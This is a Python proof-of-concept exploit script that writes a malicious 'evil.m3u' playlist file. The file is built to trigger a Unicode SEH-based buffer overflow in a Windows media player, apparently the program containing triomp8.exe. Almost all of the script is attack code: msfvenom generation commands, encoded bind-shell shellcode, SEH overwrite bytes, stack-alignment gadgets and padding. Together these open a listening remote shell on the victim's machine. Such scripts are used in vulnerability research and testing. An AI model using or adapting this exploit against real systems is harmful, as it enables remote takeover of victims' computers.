#!/usr/bin/env python

filename = "evil.m3u"

# msfvenom -p windows/shell_bind_tcp --format raw --platform windows --arch x86 > /tmp/shellcode.raw
# ./alpha2 eax --unicode --uppercase < /tmp/shellcode.raw
# Alpha2 Download Link: https://packetstormsecurity.com/files/download/34447/alpha2.tar.gz
shellcode = "PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIX52KPKPKPQP4IIUNQGPQT4KB0P04KB2LLTKPRMDTKRRO8LO7GPJMVNQKOVLOL1QSLKRNLMP7QXOLMM1GWYRKB1BPWDKPRLPTK0JOLTKPLLQSHK3Q8KQXQPQTK1IMPKQJ34KOYLXJCOJQ94KP44KM18VNQKOVL7QXOLMKQI7NXYPD5JVKS3MJXOKCMMTD5K4B84K1HMTM18SQV4KLLPK4K28MLKQJ3TKKT4KKQHPU9OTNDO4QKQK1QR9PZPQKOYPQOQO0ZTKN2ZKTMQM1XNS02KPKPQX2WSCOBQO1DC8PLBWO6M7KOJ5VX4PM1KPKPNII4R4B0QXO9SPRKKPKOXUBJM80YPP9RKMOPPPQ0PPBHIZLOYOYPKO9ETWQXM2KPLQ1LU9K6RJLPQFB7S8WR9KNW2GKO8UQGQX7GYYNXKOKOZ5PW3844ZLOKK1KO9EPWDWS83E2NPMS1KOJ5QXQSRMC4KPU9ZCQGQGR7NQJV1ZLRQIR6YRKMS6XGOTMTOLKQKQDMOTNDLPWVKP0DR4B0B6R6PVOVPVPNPVPV23PV383I8LOOTFKOZ5TIYP0N26PFKONPRHKXTGMMQPKOXU7KJPVUVBPVQX6F5EWMUMKO8UOLM63LKZU0KKYPRULEWKPGN3SBRO1ZKP1CKOJ5A"

#--------------------------------------------------------#
# nSEH => \x41\x71 => 41	INC ECX			 #
#		      0071 00	ADD BYTE PTR DS:[ECX],DH #
# SEH =>  \xF2\X41 => F2	PREFIX REPNE:		 #
#		      0041 00	ADD BYTE PTR DS:[ECX],AL #
#--------------------------------------------------------#
# x004100F2 => pop esi # pop ebx # ret 04 | triomp8.exe  #
#------------------------------------------------------- #

nSEH = "\x41\x71"
SEH = "\xF2\x41"

align = (
"\x55" 	# PUSH EBP
"\x71" 		# NOP UNICODE
"\x58" 		# POP EAX
"\x71" 		# NOP UNICODE
"\x05\x20\x11" 	# ADD 11002000,EAX
"\x71" 		# NOP UNICODE
"\x2D\x17\x11" 	# ADD 11001700,EAX
"\x71" 		# NOP UNICODE
"\x50"		# PUSH EAX
"\x71" 		# NOP UNICODE
"\xc3")		# RET

filler = "\x58"*117 	# POP EAX

boom = nSEH + SEH + align + filler + shellcode
buffer = "\x90"*536 + boom + "B"*(4466-len(boom))

textfile = open(filename, 'w')
textfile.write(buffer)
textfile.close()
